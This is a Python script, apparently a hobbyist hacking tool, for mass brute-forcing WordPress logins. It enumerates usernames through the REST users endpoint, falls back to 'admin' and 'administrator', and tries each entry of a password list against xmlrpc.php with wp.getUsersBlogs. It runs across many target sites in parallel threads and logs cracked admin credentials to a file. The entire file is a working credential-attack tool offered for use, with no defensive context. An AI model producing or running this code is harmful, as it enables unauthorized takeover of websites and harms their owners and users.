#!/usr/bin/python3

from multiprocessing.dummy import Pool
from colorama import Fore
import requests as r
import json
import os
import sys
import time

def user_check(url):
  headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0"
  }
  url += "/wp-json/wp/v2/users"
  u = r.get(url, headers=headers, timeout=3)
  if "slug" in u.text:
    s = json.loads(u.text)
    return s[0]["slug"]
  else:
    return False

def brute(uri, user, pwd):
  headers = {
    "Content-Type": "application/xml",
    "User-Agent": "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0"
  }
  site = ("%s/xmlrpc.php" % (uri))
  post = ("<?xml version=\"1.0\"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>%s</value></param><param><value>%s</value></param></params></methodCall>" % (user, pwd))
  p = r.post(site, data=post, headers=headers, timeout=3)
  p.text.encode("ascii", "ignore")
  if "isAdmin" in p.text:
    print("%s%s/wp-login.php#%s@%s" % (Fore.GREEN, uri, user, pwd))
    op = open("ok.txt", "a")
    op.write("%s/wp-login.php#%s@%s\n" % (uri, user, pwd))
    op.close()
  else:
    print("%s%s#%s@%s" % (Fore.RED, uri, user, pwd))

def main(uri):
  if "http://" not in uri and "https://" not in uri:
    uri = ("http://%s" % (uri))
  opp = open("passlist.txt","r").read().splitlines()
  for pwd in opp:
    try:
      pwd = pwd.strip()
      user = user_check(uri)
      
      if user != False:
        brute(uri, user, pwd)
      else:
        brute(uri, "admin", pwd)
        brute(uri, "administrator", pwd)
      
    except (ConnectionRefusedError, r.exceptions.Timeout, r.exceptions.ConnectionError):
      print("%s%s Can't be bruteforced" % (Fore.RED, uri))
    #except:
    #  pass
      
def banner():
  print("""
     ~Mass Xmlrpc BruteForce WordPress~
--------------------------------------------
Your inputted pass list will be renamed into passlist.txt
And at the end it'll be renamed as before
--------------------------------------------
https://www.naxtarrr.my.id
https://github.com/nastar-id
--------------------------------------------
         <<N4ST4R_ID | Naxtarrr>>\n
  """)

os.system("clear")
banner()
urls = input("Website List : ")
opu = open(urls,'r').read().splitlines()
uris = [list.strip() for list in opu]
pwdlist = input("Password List : ")
os.rename(pwdlist, "passlist.txt")
pool = Pool(int(input('Thread : ')))
try:
  print("All good list will be saved in ok.txt")
  time.sleep(1.5)
  os.system("clear")
  pool.map(main, uris) 
except KeyboardInterrupt:
  print("[!] Cancelled By User")
  os.rename("passlist.txt", pwdlist)
  sys.exit()
  
os.rename("passlist.txt", pwdlist)
